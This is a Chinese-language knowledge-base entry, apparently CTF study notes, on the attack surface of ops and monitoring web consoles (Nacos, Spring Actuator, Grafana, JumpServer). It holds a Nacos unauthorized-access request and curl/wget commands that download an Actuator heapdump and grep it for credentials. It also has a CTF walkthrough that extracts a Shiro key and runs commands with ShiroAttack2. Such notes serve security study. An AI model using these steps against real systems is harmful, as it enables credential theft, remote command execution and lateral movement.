---
title: 运维与可观测性 Web 控制台攻击面
category: web
tags: [ops-console, monitoring, grafana, kibana, nacos, actuator, jumpserver, spring-boot]
triggers: [grafana, kibana, prometheus, influxdb, jumpserver, 堡垒机, nacos, consul, eureka, actuator, jolokia, argocd, rancher, kubernetes dashboard, 运维平台, 监控大屏, 日志平台, 注册中心, 配置中心, /metrics, admin console, heapdump, ShiroKey, JDumpSpider, ShiroAttack2, 华辰企业服务, 客服工单系统, /actuator/env, /actuator/mappings]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/运维与可观测性Web控制台攻击面.md]
---

## Summary

运维平台、监控平台、堡垒机、注册中心等"高权限入口"的攻击面分析。这类平台天然掌握集群信息、数据源连接串、用户资产关系等关键数据。

## Key Points

- 这类平台泄露的不是一条记录，而是整个平台的控制能力
- 拿到低权限也不要停手——低权限也可能碰模板、作业、资产、日志、凭证
- 真正值钱的是集群、配置、会话、密钥和横向能力

## Details

### 攻击步骤

#### 1. 优先测未授权和默认信任

高频入口：默认账号、Header 信任、默认 JWT/硬编码密钥、匿名访问、独立端口没挂鉴权

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
Host: target.local:8848
User-Agent: Nacos-Server
```

#### 2. 枚举调试与管理接口（Spring/Java）

- `/actuator/health` → 版本信息
- `/actuator/env` → 环境变量、数据库配置
- `/actuator/heapdump` → 内存中挖密钥
- `/actuator/loggers` → 打开日志级别收集认证流量
- `/jolokia` → 通过配置变更触发利用链

```bash
wget http://target/actuator/heapdump -O heapdump
strings -a heapdump | grep -nE 'Authorization: Basic|jdbc:|password='
```

#### 3. 控制台内建能力 = 执行入口

作业模板、Playbook/脚本执行、查询语言、仪表盘模板、插件上传、数据源测试 — 这些能力一旦边界控制不严，就从"管理功能"滑到"执行功能"。

#### 4. 控制台沦陷后的横向价值

- 堡垒机 → 资产主机
- 监控平台 → 数据源数据库/对象存储
- 注册中心 → 服务拓扑与内网服务
- Actuator → 内存密钥/配置/下游服务
- GitOps/集群控制台 → Kubernetes API

### 5. Actuator heapdump 提取 Shiro Key → GCM 越权

**完整攻击链：** `/actuator/heapdump` 下载 → JDumpSpider 提取 Shiro Key → ShiroAttack2 GCM 模式执行命令 → 越权访问管理接口。

#### Step 1: 下载 heapdump

```bash
curl -o heapdump http://target/actuator/heapdump
```

#### Step 2: JDumpSpider 提取 ShiroKey

```bash
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
# 输出:
# CookieRememberMeManager(ShiroKey)
# algMode = GCM, key = R1pDVEZTaGlyb0dDTUtleQ==, algName = AES
```

Base64 解码 `R1pDVEZTaGlyb0dDTUtleQ==` → `GZCTFShiroGCMKey`。

#### Step 3: ShiroAttack2 利用

Java 8 环境下启动 ShiroAttack2，配置：
- `rememberMe cookie` = 任意值
- `key` = `GZCTFShiroGCMKey`
- `mode` = GCM
- `cmd` = `cat /flag_part1.txt`

#### Step 4: 探索其他管理接口

`/actuator/mappings` 暴露所有 API 路由，搜索 `admin`：

```
/api/admin/audit/list
/api/admin/ops/reports
/api/admin/system/export
/api/admin/system/summary
```

用弱密码 `user/user123` 登录后访问 `/api/admin/audit/list` 可在审计记录中获得另一半 flag。

**多阶段 flag 拼接模式：** `flag{actuator_heapdump_` + `shiro_gcm_vertical_auth}`

### 工具链速查

| 步骤 | 工具 | 关键输入 |
|------|------|---------|
| 下载 heapdump | `curl` / `wget` | `/actuator/heapdump` |
| 提取 ShiroKey | JDumpSpider | `java -jar JDumpSpider.jar heapdump` |
| Shiro RCE | ShiroAttack2 | `algMode=GCM, key=Base64(key), Java 8` |
| 扫 API 路由 | 浏览器/curl | `/actuator/mappings` |

## Connections

- Related: [[enterprise-document-report-attack-surface]]
- Related: [[cloud-security/nacos-unauthorized-access]]
- Related: [[cloud-security/container-escape]]
- GHSA: [[web/ghsa-ssrf-auth-bypass]] (Grafana/Nacos Auth Bypass)
- GHSA: [[code-audit/ghsa-cloud-security]] (CI-CD 工具链漏洞)
